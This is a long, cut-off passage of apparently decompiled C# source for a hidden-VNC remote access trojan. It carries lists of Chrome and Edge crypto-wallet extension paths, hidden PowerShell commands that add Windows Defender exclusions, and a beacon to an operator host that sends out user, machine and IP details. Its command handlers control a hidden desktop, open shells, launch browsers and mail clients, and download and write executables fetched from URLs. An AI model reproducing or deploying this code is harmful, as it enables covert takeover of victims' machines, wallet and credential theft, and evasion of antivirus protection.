using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Runtime.Serialization.Formatters;
using System.Runtime.Serialization.Formatters.Binary;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Web;
using System.Windows.Forms;
using DLL.Browser;
using DLL.Functions;
using DLL.Properties;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace DLL;

public class HVNC
{
	public static Thread tRecovery = new Thread(new ThreadStart(xRecovery));

	private static string m_desktopName;

	public static int PID;

	private static DateTime _lastCheckTime = DateTime.Now;

	private static long _frameCount = 0L;

	public static int Wallets = 0;

	public static int BrowserWallets = 0;

	private static readonly List<string[]> ChromeWalletsDirectories = new List<string[]>
	{
		new string[2]
		{
			"Chrome_Binance",
			Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\fhbohimaelbohpjbbldcngcnapndodjp"
		},
		new string[2]
		{
			"Chrome_Bitapp",
			Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\fihkakfobkmkjojpchpfgcmhfjnmnfpi"
		},
		new string[2]
		{
			"Chrome_Coin98",
			Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\aeachknmefphepccionboohckonoeemg"
		},
		new string[2]
		{
			"Chrome_Equal",
			Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\blnieiiffboillknjnepogjhkgnoapac"
		},
		new string[2]
		{
			"Chrome_Guild",
			Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\nanjmdknhkinifnkgdcggcfnhdaammmj"
		},
		new string[2]
		{
			"Chrome_Iconex",
			Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\flpiciilemghbmfalicajoolhkkenfel"
		},
		new string[2]
		{
			"Chrome_Math",
			Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\afbcbjpbpfadlkmhmclhkeeodmamcflc"
		},
		new string[2]
		{
			"Chrome_Mobox",
			Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\fcckkdbjnoikooededlapcalpionmalo"
		},
		new string[2]
		{
			"Chrome_Phantom",
			Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\bfnaelmomeimhlpmgjnjophhpkkoljpa"
		},
		new string[2]
		{
			"Chrome_Tron",
			Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\ibnejdfjmmkpcnlpebklmnkoeoihofec"
		},
		new string[2]
		{
			"Chrome_XinPay",
			Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\bocpokimicclpaiekenaeelehdjllofo"
		},
		new string[2]
		{
			"Chrome_Ton",
			Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\nphplpgoakhhjchkkhmiggakijnkhfnd"
		},
		new string[2]
		{
			"Chrome_Metamask",
			Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn"
		},
		new string[2]
		{
			"Chrome_Sollet",
			Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\fhmfendgdocmcbmfikdcogofphimnkno"
		},
		new string[2]
		{
			"Chrome_Slope",
			Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\pocmplpaccanhmnllbbkpgfliimjljgo"
		},
		new string[2]
		{
			"Chrome_Starcoin",
			Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\mfhbebgoclkghebffdldpobeajmbecfk"
		},
		new string[2]
		{
			"Chrome_Swash",
			Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\cmndjbecilbocjfkibfbifhngkdmjgog"
		},
		new string[2]
		{
			"Chrome_Finnie",
			Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\cjmkndjhnagcfbpiemnkdpomccnjblmj"
		},
		new string[2]
		{
			"Chrome_Keplr",
			Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\dmkamcknogkgcdfhhbddcghachkejeap"
		},
		new string[2]
		{
			"Chrome_Crocobit",
			Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\pnlfjmlcjdjgkddecgincndfgegkecke"
		},
		new string[2]
		{
			"Chrome_Oxygen",
			Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\fhilaheimglignddkjgofkcbgekhenbh"
		},
		new string[2]
		{
			"Chrome_Nifty",
			Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\jbdaocneiiinmjbjlgalhcelgbejmnid"
		},
		new string[2]
		{
			"Chrome_Liquality",
			Paths.Lappdata + "\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\kpfopkelmapcoipemfendmdcghnegimn"
		}
	};

	private static readonly List<string[]> EdgeWalletsDirectories = new List<string[]>
	{
		new string[2]
		{
			"Edge_Auvitas",
			Paths.Lappdata + "\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\klfhbdnlcfcaccoakhceodhldjojboga"
		},
		new string[2]
		{
			"Edge_Math",
			Paths.Lappdata + "\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\dfeccadlilpndjjohbjdblepmjeahlmm"
		},
		new string[2]
		{
			"Edge_Metamask",
			Paths.Lappdata + "\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\ejbalbakoplchlghecdalmeeeajnimhm"
		},
		new string[2]
		{
			"Edge_MTV",
			Paths.Lappdata + "\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\oooiblbdpdlecigodndinbpfopomaegl"
		},
		new string[2]
		{
			"Edge_Rabet",
			Paths.Lappdata + "\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\aanjhgiamnacdfnlfnmgehjikagdbafd"
		},
		new string[2]
		{
			"Edge_Ronin",
			Paths.Lappdata + "\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\bblmcdckkhkhfhhpfcchlpalebmonecp"
		},
		new string[2]
		{
			"Edge_Yoroi",
			Paths.Lappdata + "\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\akoiaibnepcedcplijmiamnaigbepmcb"
		},
		new string[2]
		{
			"Edge_Zilpay",
			Paths.Lappdata + "\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\fbekallmnjoeggkefjkbebpineneilec"
		},
		new string[2]
		{
			"Edge_Exodus",
			Paths.Lappdata + "\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\jdiccldimpdaibmpdkjnbmckianbfold"
		},
		new string[2]
		{
			"Edge_Terra_Station",
			Paths.Lappdata + "\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\ajkhoeiiokighlmdnlakpjfoobnjinie"
		},
		new string[2]
		{
			"Edge_Jaxx",
			Paths.Lappdata + "\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\dmdimapfghaakeibppbfeokhgoikeoci"
		}
	};

	public static string userFame = Environment.UserName;

	public static Random random = new Random();

	private const short SWP_NOMOVE = 2;

	private const short SWP_NOSIZE = 1;

	private const short SWP_NOZORDER = 4;

	private const int SWP_SHOWWINDOW = 64;

	private static void xRecovery()
	{
		HVNC.IcarusRec();
	}

	[MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
	[STAThread]
	private static void Main(string[] cmdArgs)
	{
		Process.Start(new ProcessStartInfo
		{
			FileName = "cmd",
			Arguments = "/k start /b powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath " + Process.GetCurrentProcess().MainModule.FileName + " & exit",
			CreateNoWindow = true,
			WindowStyle = ProcessWindowStyle.Hidden,
			UseShellExecute = true,
			ErrorDialog = false
		});
		Process.Start(new ProcessStartInfo
		{
			FileName = "cmd",
			Arguments = "/k start /b powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath cvtres.exe & exit",
			CreateNoWindow = true,
			WindowStyle = ProcessWindowStyle.Hidden,
			UseShellExecute = true,
			ErrorDialog = false
		});
		try
		{
			Mutex mutex = new Mutex(initiallyOwned: false, cmdArgs[3]);
			if (!mutex.WaitOne(0, exitContext: false))
			{
				mutex.Close();
				mutex = null;
			}
		}
		catch
		{
			Mutex mutex2 = new Mutex(initiallyOwned: false, "01234567890");
			if (!mutex2.WaitOne(0, exitContext: false))
			{
				mutex2.Close();
				mutex2 = null;
			}
		}
		try
		{
			Outils.HigherThan81 = Conversions.ToBoolean(Outils.Isgreaterorequalto81());
			Outils.TitleBarHeight = Outils.GetSystemMetrics(4);
			if (Outils.TitleBarHeight < 5)
			{
				Outils.TitleBarHeight = 20;
			}
			Outils.Identifier = Conversions.ToString(cmdArgs[0]);
			Outils.ip = cmdArgs[1];
			Outils.port = Conversions.ToInteger(cmdArgs[2]);
			Outils.username = Environment.UserName + "@" + Environment.MachineName;
			Outils.screenx = Screen.PrimaryScreen.Bounds.Width;
			Outils.screeny = Screen.PrimaryScreen.Bounds.Height;
			HVNC.SendData(Outils.ip, Outils.port);
			while (true)
			{
				Thread.Sleep(10000);
			}
		}
		catch
		{
		}
	}

	private static void SendData(string ip, int port)
	{
		while (true)
		{
			Outils.Client = new TcpClient();
			Thread.Sleep(1000);
			try
			{
				Outils.Client.Connect(ip, port);
			}
			catch
			{
				continue;
			}
			break;
		}
		Outils.nstream = Outils.Client.GetStream();
		Outils.nstream.BeginRead(new byte[1], 0, 0, new AsyncCallback(Read), null);
		try
		{
			string text = (string)Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion").GetValue("productName");
			RegionInfo currentRegion = RegionInfo.CurrentRegion;
			if (!File.Exists(Interaction.Environ("APPDATA") + "\\temp0923"))
			{
				File.WriteAllText(Interaction.Environ("APPDATA") + "\\temp0923", DateTime.UtcNow.ToString("MM/dd/yyyy"));
			}
			string text2 = File.ReadAllText(Interaction.Environ("APPDATA") + "\\temp0923");
			IPAddress iPAddress = IPAddress.Parse(new WebClient().DownloadString("http://ipinfo.io/ip").Replace("\\r\\n", "").Replace("\\n", "")
				.Trim());
			Outils.Client.Client.RemoteEndPoint.ToString().Split(':');
			Outils.SendInformation(Outils.nstream, "54321|" + Outils.Identifier + "_ | " + Outils.username + "|" + currentRegion.Name.ToString() + "|" + text + "|" + text2 + "|" + HVNC.versioning() + "|" + iPAddress.ToString());
		}
		catch
		{
		}
	}

	public static string versioning()
	{
		return FileVersionInfo.GetVersionInfo(Assembly.GetExecutingAssembly().Location).ProductVersion;
	}

	public static void Read(IAsyncResult ar)
	{
		checked
		{
			try
			{
				lock (Outils.Client)
				{
					BinaryFormatter binaryFormatter = new BinaryFormatter();
					binaryFormatter.AssemblyFormat = FormatterAssemblyStyle.Simple;
					binaryFormatter.TypeFormat = FormatterTypeStyle.TypesAlways;
					binaryFormatter.FilterLevel = TypeFilterLevel.Full;
					byte[] array = new byte[8];
					int num = 8;
					int num2 = 0;
					while (num > 0)
					{
						int num3 = Outils.nstream.Read(array, num2, num);
						if (num3 == 0)
						{
							throw new SocketException(10054);
						}
						int num4 = num3;
						num -= num4;
						num2 += num4;
					}
					ulong num5 = BitConverter.ToUInt64(array, 0);
					int num6 = 0;
					byte[] array2 = new byte[Convert.ToInt32(decimal.Subtract(new decimal(num5), 1m)) + 1];
					object objectValue;
					using (MemoryStream memoryStream = new MemoryStream())
					{
						int num7 = 0;
						int num8 = array2.Length;
						while (num8 > 0)
						{
							int num9 = Outils.nstream.Read(array2, num7, num8);
							if (num9 == 0)
							{
								throw new SocketException(10054);
							}
							num6 = num9;
							num8 -= num6;
							num7 += num6;
						}
						memoryStream.Write(array2, 0, (int)num5);
						memoryStream.Position = 0L;
						objectValue = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(binaryFormatter.Deserialize(memoryStream)));
						memoryStream.Close();
						memoryStream.Dispose();
					}
					HVNC.HandleData(RuntimeHelpers.GetObjectValue(objectValue));
					Outils.nstream.BeginRead(new byte[1], 0, 0, new AsyncCallback(Read), null);
				}
			}
			catch (Exception)
			{
				Outils.Client.Close();
				Outils.newt.Abort();
				HVNC.SendData(Outils.ip, Outils.port);
			}
		}
	}

	private static void HandleData(object str)
	{
		try
		{
			ThreadPool.QueueUserWorkItem(state: RuntimeHelpers.GetObjectValue(Strings.Split(Conversions.ToString(str), "*", -1, CompareMethod.Text)), callBack: new WaitCallback(ReceiveCommand));
		}
		catch
		{
		}
	}

	public static void ReceiveCommand(object id)
	{
		try
		{
			object left = NewLateBinding.LateIndexGet(id, new object[1] { 0 }, null);
			if (Operators.ConditionalCompareObjectEqual(left, 0, TextCompare: false))
			{
				try
				{
					Outils.SendInformation(Outils.nstream, "0|" + Conversions.ToString(Outils.screenx) + "|" + Conversions.ToString(Outils.screeny));
				}
				catch
				{
				}
				Outils.newt = new Thread(new ThreadStart(Outils.SCT));
				Outils.newt.SetApartmentState(ApartmentState.STA);
				Outils.newt.IsBackground = true;
				Outils.newt.Start();
			}
			else if (Operators.ConditionalCompareObjectEqual(left, 1, TextCompare: false))
			{
				Outils.newt.Abort();
			}
			else if (Operators.ConditionalCompareObjectEqual(left, 2, TextCompare: false))
			{
				Outils.PostClickLD(Conversions.ToInteger(NewLateBinding.LateIndexGet(id, new object[1] { 1 }, null)), Conversions.ToInteger(NewLateBinding.LateIndexGet(id, new object[1] { 2 }, null)));
			}
			else if (Operators.ConditionalCompareObjectEqual(left, 3, TextCompare: false))
			{
				Outils.PostClickRD(Conversions.ToInteger(NewLateBinding.LateIndexGet(id, new object[1] { 1 }, null)), Conversions.ToInteger(NewLateBinding.LateIndexGet(id, new object[1] { 2 }, null)));
			}
			else if (Operators.ConditionalCompareObjectEqual(left, 4, TextCompare: false))
			{
				Outils.PostClickLU(Conversions.ToInteger(NewLateBinding.LateIndexGet(id, new object[1] { 1 }, null)), Conversions.ToInteger(NewLateBinding.LateIndexGet(id, new object[1] { 2 }, null)));
			}
			else if (Operators.ConditionalCompareObjectEqual(left, 5, TextCompare: false))
			{
				Outils.PostClickRU(Conversions.ToInteger(NewLateBinding.LateIndexGet(id, new object[1] { 1 }, null)), Conversions.ToInteger(NewLateBinding.LateIndexGet(id, new object[1] { 2 }, null)));
			}
			else if (Operators.ConditionalCompareObjectEqual(left, 6, TextCompare: false))
			{
				Outils.PostDblClk(Conversions.ToInteger(NewLateBinding.LateIndexGet(id, new object[1] { 1 }, null)), Conversions.ToInteger(NewLateBinding.LateIndexGet(id, new object[1] { 2 }, null)));
			}
			else if (Operators.ConditionalCompareObjectEqual(left, 7, TextCompare: false))
			{
				Outils.PostKeyDown(Conversions.ToString(NewLateBinding.LateIndexGet(id, new object[1] { 1 }, null)));
			}
			else if (Operators.ConditionalCompareObjectEqual(left, 8, TextCompare: false))
			{
				Outils.PostMove(Conversions.ToInteger(NewLateBinding.LateIndexGet(id, new object[1] { 1 }, null)), Conversions.ToInteger(NewLateBinding.LateIndexGet(id, new object[1] { 2 }, null)));
			}
			else if (Operators.ConditionalCompareObjectEqual(left, 9, TextCompare: false))
			{
				Outils.SendInformation(Outils.nstream, Operators.ConcatenateObject("9|", HVNC.CopyText()));
			}
			else if (Operators.ConditionalCompareObjectEqual(left, 4875, TextCompare: false))
			{
				Process.Start("cmd.exe").WaitForInputIdle();
			}
			else if (Operators.ConditionalCompareObjectEqual(left, 4876, TextCompare: false))
			{
				Process.Start("powershell.exe").WaitForInputIdle();
			}
			else if (Operators.ConditionalCompareObjectEqual(left, 10, TextCompare: false))
			{
				HVNC.PasteText(Conversions.ToString(NewLateBinding.LateIndexGet(id, new object[1] { 1 }, null)));
			}
			else if (Operators.ConditionalCompareObjectEqual(left, 11, TextCompare: false))
			{
				Chrome.StartChrome(Conversions.ToBoolean(NewLateBinding.LateIndexGet(id, new object[1] { 1 }, null)));
			}
			else if (Operators.ConditionalCompareObjectEqual(left, 12, TextCompare: false))
			{
				Firefox.StartFirefox(Conversions.ToBoolean(NewLateBinding.LateIndexGet(id, new object[1] { 1 }, null)));
			}
			else if (Operators.ConditionalCompareObjectEqual(left, 13, TextCompare: false))
			{
				HVNC.ShowStartMenu();
			}
			else if (Operators.ConditionalCompareObjectEqual(left, 14, TextCompare: false))
			{
				HVNC.MinTop();
			}
			else if (Operators.ConditionalCompareObjectEqual(left, 15, TextCompare: false))
			{
				HVNC.RestoreMaxTop();
			}
			else if (Operators.ConditionalCompareObjectEqual(left, 16, TextCompare: false))
			{
				HVNC.CloseTop();
			}
			else if (Operators.ConditionalCompareObjectEqual(left, 17, TextCompare: false))
			{
				Outils.interval = Conversions.ToInteger(NewLateBinding.LateIndexGet(id, new object[1] { 1 }, null));
			}
			else if (Operators.ConditionalCompareObjectEqual(left, 18, TextCompare: false))
			{
				Outils.quality = Conversions.ToInteger(NewLateBinding.LateIndexGet(id, new object[1] { 1 }, null));
			}
			else if (Operators.ConditionalCompareObjectEqual(left, 19, TextCompare: false))
			{
				Outils.resize = Conversions.ToDouble(NewLateBinding.LateIndexGet(id, new object[1] { 1 }, null));
			}
			else if (Operators.ConditionalCompareObjectEqual(left, 21, TextCompare: false))
			{
				HVNC.StartExplorer();
			}
			else if (Operators.ConditionalCompareObjectEqual(left, 24, TextCompare: false))
			{
				Process.GetCurrentProcess().Kill();
				Process.GetProcessById(HVNC.PID).Kill();
			}
			else if (Operators.ConditionalCompareObjectEqual(left, 30, TextCompare: false))
			{
				Edge.StartEdge(Conversions.ToBoolean(NewLateBinding.LateIndexGet(id, new object[1] { 1 }, null)));
			}
			else if (Operators.ConditionalCompareObjectEqual(left, 32, TextCompare: false))
			{
				Brave.StartBrave(Conversions.ToBoolean(NewLateBinding.LateIndexGet(id, new object[1] { 1 }, null)));
			}
			else if (Operators.ConditionalCompareObjectEqual(left, 56, TextCompare: false))
			{
				HVNC.DownloadExecute(Conversions.ToString(NewLateBinding.LateIndexGet(id, new object[1] { 1 }, null)));
			}
			else if (Operators.ConditionalCompareObjectEqual(left, 55, TextCompare: false))
			{
				Outils.tempFile = HVNC.RandomString(9);
				ServicePointManager.Expect100Continue = true;
				ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls;
				ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
				if (Conversions.ToString(NewLateBinding.LateIndexGet(id, new object[1] { 1 }, null)).Contains("Icar.jpg"))
				{
					if (Conversions.ToString(NewLateBinding.LateIndexGet(id, new object[1] { 5 }, null)) == "0")
					{
						Outils.MFile = "\\" + Outils.tempFile + ".exe";
						Outils.MPath = Interaction.Environ("USERPROFILE") + "\\Desktop\\" + Outils.tempFile;
					}
					if (Conversions.ToString(NewLateBinding.LateIndexGet(id, new object[1] { 5 }, null)) == "1")
					{
						Outils.MFile = "\\" + Outils.tempFile + ".exe";
						Outils.MPath = Interaction.Environ("LOCALAPPDATA") + "\\" + Outils.tempFile;
					}
					if (Conversions.ToString(NewLateBinding.LateIndexGet(id, new object[1] { 5 }, null)) == "2")
					{
						Outils.MFile = "\\" + Outils.tempFile + ".exe";
						Outils.MPath = Interaction.Environ("ProgramFiles") + "\\" + Outils.tempFile;
					}
					if (Conversions.ToString(NewLateBinding.LateIndexGet(id, new object[1] { 5 }, null)) == "3")
					{
						Outils.MFile = "\\" + Outils.tempFile + ".exe";
						Outils.MPath = Interaction.Environ("APPDATA") + "\\" + Outils.tempFile;
					}
					if (Conversions.ToString(NewLateBinding.LateIndexGet(id, new object[1] { 5 }, null)) == "4")
					{
						Outils.MFile = "\\" + Outils.tempFile + ".exe";
						Outils.MPath = Interaction.Environ("Temp") + "\\" + Outils.tempFile;
					}
					if (!Directory.Exists(Outils.MPath))
					{
						Directory.CreateDirectory(Outils.MPath);
					}
					byte[] bytes = Convert.FromBase64String(new StreamReader(new WebClient().OpenRead(Conversions.ToString(NewLateBinding.LateIndexGet(id, new object[1] { 1 }, null)))).ReadToEnd());
					StreamWriter streamWriter = new StreamWriter(Outils.MPath + Outils.MFile + ".bat");
					streamWriter.WriteLine(Outils.MPath + Outils.MFile + " telegram " + Conversions.ToString(NewLateBinding.LateIndexGet(id, new object[1] { 3 }, null)) + " " + Conversions.ToString(NewLateBinding.LateIndexGet(id, new object[1] { 4 }, null)));
					streamWriter.WriteLine("pause");
					streamWriter.Close();
					try
					{
						File.WriteAllBytes(Outils.MPath + Outils.MFile, bytes);
					}
					catch (Exception ex)
					{
						MessageBox.Show(ex.Message);
					}
					Outils.SendInformation(Outils.nstream, "222|");
					HVNC.StartMethod2("Hide");
				}
				else if (Conversions.ToString(NewLateBinding.LateIndexGet(id, new object[1] { 1 }, null)).Contains("Icars.jpg"))
				{
					if (Conversions.ToString(NewLateBinding.LateIndexGet(id, new object[1] { 4 }, null)) == "0")
					{
						Outils.MFile = "\\" + Outils.tempFile + ".exe";
						Outils.MPath = Interaction.Environ("USERPROFILE") + "\\Desktop\\" + Outils.tempFile;
					}
					if (Conversions.ToString(NewLateBinding.LateIndexGet(id, new object[1] { 4 }, null)) == "1")
					{
						Outils.MFile = "\\" + Outils.tempFile + ".exe";
						Outils.MPath = Interaction.Environ("LOCALAPPDATA") + "\\" + Outils.tempFile;
					}
					if (Conversions.ToString(NewLateBinding.LateIndexGet(id, new object[1] { 4 }, null)) == "2")
					{
						Outils.MFile = "\\" + Outils.tempFile + ".exe";
						Outils.MPath = Interaction.Environ("ProgramFiles") + "\\" + Outils.tempFile;
					}
					if (Conversions.ToString(NewLateBinding.LateIndexGet(id, new object[1] { 4 }, null)) == "3")
					{
						Outils.MFile = "\\" + Outils.tempFile + ".exe";
						Outils.MPath = Interaction.Environ("APPDATA") + "\\" + Outils.tempFile;
					}
					if (Conversions.ToString(NewLateBinding.LateIndexGet(id, new object[1] { 4 }, null)) == "4")
					{
						Outils.MFile = "\\" + Outils.tempFile + ".exe";
						Outils.MPath = Interaction.Environ("Temp") + "\\" + Outils.tempFile;
					}
					if (!Directory.Exists(Outils.MPath))
					{
						Directory.CreateDirectory(Outils.MPath);
					}
					byte[] bytes2 = Convert.FromBase64String(new StreamReader(new WebClient().OpenRead(Conversions.ToString(NewLateBinding.LateIndexGet(id, new object[1] { 1 }, null)))).ReadToEnd());
					StreamWriter streamWriter2 = new StreamWriter(Outils.MPath + Outils.MFile + ".bat");
					streamWriter2.WriteLine(Outils.MPath + Outils.MFile + " discord " + Conversions.ToString(NewLateBinding.LateIndexGet(id, new object[1] { 3 }, null)));
					streamWriter2.WriteLine("pause");
					streamWriter2.Close();
					try
					{
						File.WriteAllBytes(Outils.MPath + Outils.MFile, bytes2);
					}
					catch (Exception ex2)
					{
						MessageBox.Show(ex2.Message);
					}
					Outils.SendInformation(Outils.nstream, "223|");
					HVNC.StartMethod2("Hide");
				}
				else if (Conversions.ToString(NewLateBinding.LateIndexGet(id, new object[1] { 1 }, null)).Contains("IcarsS.jpg"))
				{
					if (Conversions.ToString(NewLateBinding.LateIndexGet(id, new object[1] { 3 }, null)) == "0")
					{
						Outils.MFile = "\\" + Outils.tempFile + ".exe";
						Outils.MPath = Interaction.Environ("USERPROFILE") + "\\Desktop\\" + Outils.tempFile;
					}
					if (Conversions.ToString(NewLateBinding.LateIndexGet(id, new object[1] { 3 }, null)) == "1")
					{
						Outils.MFile = "\\" + Outils.tempFile + ".exe";
						Outils.MPath = Interaction.Environ("LOCALAPPDATA") + "\\" + Outils.tempFile;
					}
					if (Conversions.ToString(NewLateBinding.LateIndexGet(id, new object[1] { 3 }, null)) == "2")
					{
						Outils.MFile = "\\" + Outils.tempFile + ".exe";
						Outils.MPath = Interaction.Environ("ProgramFiles") + "\\" + Outils.tempFile;
					}
					if (Conversions.ToString(NewLateBinding.LateIndexGet(id, new object[1] { 3 }, null)) == "3")
					{
						Outils.MFile = "\\" + Outils.tempFile + ".exe";
						Outils.MPath = Interaction.Environ("APPDATA") + "\\" + Outils.tempFile;
					}
					if (Conversions.ToString(NewLateBinding.LateIndexGet(id, new object[1] { 3 }, null)) == "4")
					{
						Outils.MFile = "\\" + Outils.tempFile + ".exe";
						Outils.MPath = Interaction.Environ("Temp") + "\\" + Outils.tempFile;
					}
					if (!Directory.Exists(Outils.MPath))
					{
						Directory.CreateDirectory(Outils.MPath);
					}
					byte[] bytes3 = Convert.FromBase64String(new StreamReader(new WebClient().OpenRead(Conversions.ToString(NewLateBinding.LateIndexGet(id, new object[1] { 1 }, null)))).ReadToEnd());
					StreamWriter streamWriter3 = new StreamWriter(Outils.MPath + Outils.MFile + ".bat");
					streamWriter3.WriteLine(Outils.MPath + Outils.MFile + " socket");
					streamWriter3.WriteLine("pause");
					streamWriter3.Close();
					try
					{
						File.WriteAllBytes(Outils.MPath + Outils.MFile, bytes3);
					}
					catch (Exception ex3)
					{
						MessageBox.Show(ex3.Message);
					}
					Outils.SendInformation(Outils.nstream, "223|");
					HVNC.StartMethod2("Hide");
				}
				else if (Conversions.ToString(NewLateBinding.LateIndexGet(id, new object[1] { 1 }, null)).Contains("TV"))
				{
					if (Conversions.ToString(NewLateBinding.LateIndexGet(id, new object[1] { 3 }, null)) == "0")
					{
						Outils.MFile = "\\" + Outils.tempFile + ".exe";
						Outils.MPath = Interaction.Environ("USERPROFILE") + "\\Desktop\\" + Outils.tempFile;
					}
					if (Conversions.ToString(NewLateBinding.LateIndexGet(id, new object[1] { 3 }, null)) == "1")
					{
						Outils.MFile = "\\" + Outils.tempFile + ".exe";
						Outils.MPath = Interaction.Environ("LOCALAPPDATA") + "\\" + Outils.tempFile;
					}
					if (Conversions.ToString(NewLateBinding.LateIndexGet(id, new object[1] { 3 }, null)) == "2")
					{
						Outils.MFile = "\\" + Outils.tempFile + ".exe";
						Outils.MPath = Interaction.Environ("ProgramFiles") + "\\" + Outils.tempFile;
					}
					if (Conversions.ToString(NewLateBinding.LateIndexGet(id, new object[1] { 3 }, null)) == "3")
					{
						Outils.MFile = "\\" + Outils.tempFile + ".exe";
						Outils.MPath = Interaction.Environ("APPDATA") + "\\" + Outils.tempFile;
					}
					if (Conversions.ToString(NewLateBinding.LateIndexGet(id, new object[1] { 3 }, null)) == "4")
					{
						Outils.MFile = "\\" + Outils.tempFile + ".exe";
						Outils.MPath = Interaction.Environ("Temp") + "\\" + Outils.tempFile;
					}
					if (!Directory.Exists(Outils.MPath))
					{
						Directory.CreateDirectory(Outils.MPath);
					}
					byte[] bytes4 = Convert.FromBase64String(Conversions.ToString(NewLateBinding.LateIndexGet(id, new object[1] { 1 }, null)));
					StreamWriter streamWriter4 = new StreamWriter(Outils.MPath + Outils.MFile + ".bat");
					streamWriter4.WriteLine(Outils.MPath + Outils.MFile + " " + Conversions.ToString(NewLateBinding.LateIndexGet(id, new object[1] { 2 }, null)));
					streamWriter4.WriteLine("pause");
					streamWriter4.Close();
					try
					{
						File.WriteAllBytes(Outils.MPath + Outils.MFile, bytes4);
					}
					catch (Exception ex4)
					{
						MessageBox.Show(ex4.Message);
					}
					Outils.SendInformation(Outils.nstream, "223|");
					HVNC.StartMethod2("Hide");
				}
			}
			else if (Operators.ConditionalCompareObjectEqual(left, 50, TextCompare: false))
			{
				HVNC.KillMiner();
			}
			else if (Operators.ConditionalCompareObjectEqual(left, 555, TextCompare: false))
			{
				HVNC.StartOutlook();
				Outils.SendInformation(Outils.nstream, "2555|Outlook has been started!");
			}
			else if (Operators.ConditionalCompareObjectEqual(left, 556, TextCompare: false))
			{
				HVNC.StartFoxMail();
				Outils.SendInformation(Outils.nstream, "2556|Foxmail has been started!");
			}
			else if (Operators.ConditionalCompareObjectEqual(left, 557, TextCompare: false))
			{
				HVNC.StartThunderbird();
				Outils.SendInformation(Outils.nstream, "2557|Thunderbird has been started!");
			}
			else if (Operators.ConditionalCompareObjectEqual(left, 1337, TextCompare: false))
			{
				HVNC.GetPong();
			}
			else if (Operators.ConditionalCompareObjectEqual(left, 8889, TextCompare: false))
			{
				HVNC.unnistall();
			}
			else if (Operators.ConditionalCompareObjectEqual(left, 444, TextCompare: false))
			{
				Opera.StartOpera(Conversions.ToBoolean(NewLateBinding.LateIndexGet(id, new object[1] { 1 }, null)));
			}
			else if (Operators.ConditionalCompareObjectEqual(left, 991, TextCompare: false))
			{
				treesix.Start360(Conversions.ToBoolean(NewLateBinding.LateIndexGet(id, new object[1] { 1 }, null)));
			}
			else if (Operators.ConditionalCompareObjectEqual(left, 992, TextCompare: false))
			{
				Atom.StartAtom(Conversions.ToBoolean(NewLateBinding.LateIndexGet(id, new object[1] { 1 }, null)));
			}
			else
			{
				if (Operators.ConditionalCompareObjectEqual(left, 993, TextCompare: false))
				{
					return;
				}
				if (Operators.ConditionalCompareObjectEqual(left, 994, TextCompare: false))
				{
					HVNC.KillApp("dragon.exe");
					Chromodo.StartChromodo(Conversions.ToBoolean(NewLateBinding.LateIndexGet(id, new object[1] { 1 }, null)));
				}
				else
				{
					if (Operators.ConditionalCompareObjectEqual(left, 995, TextCompare: false))
					{
						return;
					}
					if (Operators.ConditionalCompareObjectEqual(left, 996, TextCompare: false))
					{
						HVNC.KillApp("chromodo.exe");
						comodo.StartDragon(Conversions.ToBoolean(NewLateBinding.LateIndexGet(id, new object[1] { 1 }, null)));
					}
					else if (Operators.ConditionalCompareObjectEqual(left, 997, TextCompare: false))
					{
						Epic.StartEpic(Conversions.ToBoolean(NewLateBinding.LateIndexGet(id, new object[1] { 1 }, null)));
					}
